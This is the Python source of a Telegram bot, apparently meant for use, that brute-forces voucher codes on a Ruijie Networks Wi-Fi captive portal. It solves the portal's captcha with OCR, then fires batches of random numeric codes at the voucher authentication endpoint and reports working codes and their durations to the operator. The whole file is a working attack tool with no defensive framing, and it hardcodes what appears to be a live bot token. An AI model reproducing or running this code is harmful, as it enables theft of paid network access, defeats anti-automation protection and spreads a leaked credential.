import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, io
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# --- Configuration ---
BOT_TOKEN = '8947878806:AAE5Op8nDyAEtCqQDz5GvdAV5nHPUaP40mQ'
ADMIN_ID = '6658845504'
# ---------------------

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
_connector = None
_global_session = None

COMMON_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'https://portal-as.ruijienetworks.com',
    'Referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html'
}

_ocr = ddddocr.DdddOcr(show_ad=False)

async def handle(request): return web.Response(text="Bot is running!")
async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', 8099).start()

@bot.message_handler(commands=['start'])
async def start(message):
    cid = message.chat.id
    if str(cid) == ADMIN_ID:
        approve[cid] = True
        user_data[cid] = {"plan": "Unlimited"}
        await bot.reply_to(message, "🚀 Bot Ready!\n\n/input <URL> - URL ထည့်ရန်\n/test - အဆင့်ဆင့်စစ်ဆေးရန်\n/scan <mode> - စတင်ရန်")
    else:
        await bot.reply_to(message, f"သင်၏ ID: {cid} ကို Register အရင်လုပ်ပါ။")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    user_data[message.chat.id] = {'session_url': args[1], 'plan': 'Unlimited'}
    approve[message.chat.id] = True
    await bot.reply_to(message, "✅ URL သိမ်းဆည်းပြီးပါပြီ။ /test ဖြင့် အဆင့်ဆင့် စစ်ဆေးပါ။")

@bot.message_handler(commands=['test'])
async def test_connection(message):
    cid = message.chat.id
    if cid not in user_data: return await bot.reply_to(message, "အရင်ဆုံး /input ဖြင့် URL ထည့်ပေးပါ။")
    
    await bot.send_message(cid, "🔍 Captcha Verification ကို အဆင့်ဆင့် စမ်းသပ်နေပါတယ်...")
    url = user_data[cid]['session_url']
    
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as sess:
        sid = await get_session_id(sess, url)
        if not sid: return await bot.send_message(cid, "❌ Step 1: Session Not Found!")
        await bot.send_message(cid, f"✅ Step 1: Session Found!\nSID: {sid[:15]}...")
        
        await bot.send_message(cid, "⏳ Step 2: Captcha ရယူနေပါသည်...")
        img = await Captcha_Image(sess, sid)
        if not img: return await bot.send_message(cid, "❌ Step 2: Captcha Failed!")
        await bot.send_photo(cid, img, caption="✅ Step 2: Captcha ရရှိပါပြီ")
        
        text = await Captcha_Text(img)
        await bot.send_message(cid, f"✅ Step 3: OCR Result: {text}\n⏳ ၁ စက္ကန့် စောင့်နေပါသည်...")
        await asyncio.sleep(1)
        
        if await Varify_Captcha(sess, sid, text):
            await bot.send_message(cid, "✅ Step 4: Captcha Verified! Bot အဆင်သင့်ဖြစ်ပါပြီ။ /scan စတင်နိုင်ပါပြီ။")
        else:
            await bot.send_message(cid, "❌ Step 4: Verification Failed! OCR မှားနိုင်ပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return await bot.reply_to(message, "ဥပမာ - /scan 8")
    mode, cid = args[1], message.chat.id
    if not approve.get(cid): return
    
    progress_msg = await bot.send_message(cid, "🔍 Scanning Codes...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, cid, user_data[cid]['session_url'], scan_id, progress_msg))
    scan_tasks[cid] = {"task": task, "stop": False, "scan_id": scan_id}

async def run_bruteforce(mode, cid, url, scan_id, progress_msg):
    checked, start = 0, time.monotonic()
    while True:
        cur = scan_tasks.get(cid)
        if not cur or cur.get("stop"): break
        batch = ["".join(random.choice(string.digits) for _ in range(int(mode))) for _ in range(50)]
        async def _check(code):
            return await perform_check(_global_session, url, code, cid)
        await asyncio.gather(*[_check(c) for c in batch])
        checked += len(batch)
        if checked % 100 == 0:
            elapsed = time.monotonic() - start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            try: await bot.edit_message_text(f"🔍 Scanning...\n📦 Checked: {checked:,}\n⚡ Speed: {speed:,.0f} codes/min", cid, progress_msg.message_id)
            except: pass

async def perform_check(session, url, code, cid):
    try:
        sid = await get_session_id(session, url)
        if not sid: return
        img = await Captcha_Image(session, sid)
        text = await Captcha_Text(img)
        if text and await Varify_Captcha(session, sid, text):
            async with session.post("https://portal-as.ruijienetworks.com/api/auth/voucher/", json={"accessCode": code, "sessionId": sid, "authCode": text}, headers=COMMON_HEADERS) as r:
                resp = await r.json()
                if resp.get("success") or 'logonUrl' in str(resp):
                    dur = parse_duration(json.dumps(resp))
                    await bot.send_message(cid, f"✅ Success Found!\nCode: {code}\nDuration: {dur}")
    except: pass

def parse_duration(resp_text):
    for d in ["1 hour", "2 hours", "3 hours", "1 day", "15 days", "30 days"]:
        if d.lower() in resp_text.lower(): return d
    return "Unlimited"

async def get_session_id(session, url):
    try:
        async with session.get(url, allow_redirects=True, timeout=5) as r:
            m = re.search(r"sessionId=([a-zA-Z0-9]+)", str(r.url))
            return m.group(1) if m else None
    except: return None

async def Captcha_Image(session, sid):
    try:
        async with session.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}', timeout=5) as r:
            return await r.read() if r.status == 200 else None
    except: return None

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr.classification, img_bytes)

async def Varify_Captcha(session, sid, text):
    try:
        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': text}, timeout=5) as r:
            return (await r.json()).get("success")
    except: return False

async def main():
    global _connector, _global_session
    _connector = aiohttp.TCPConnector(limit=500, ssl=False)
    _global_session = aiohttp.ClientSession(connector=_connector)
    asyncio.create_task(web_server())
    await bot.infinity_polling()

if __name__ == '__main__': asyncio.run(main())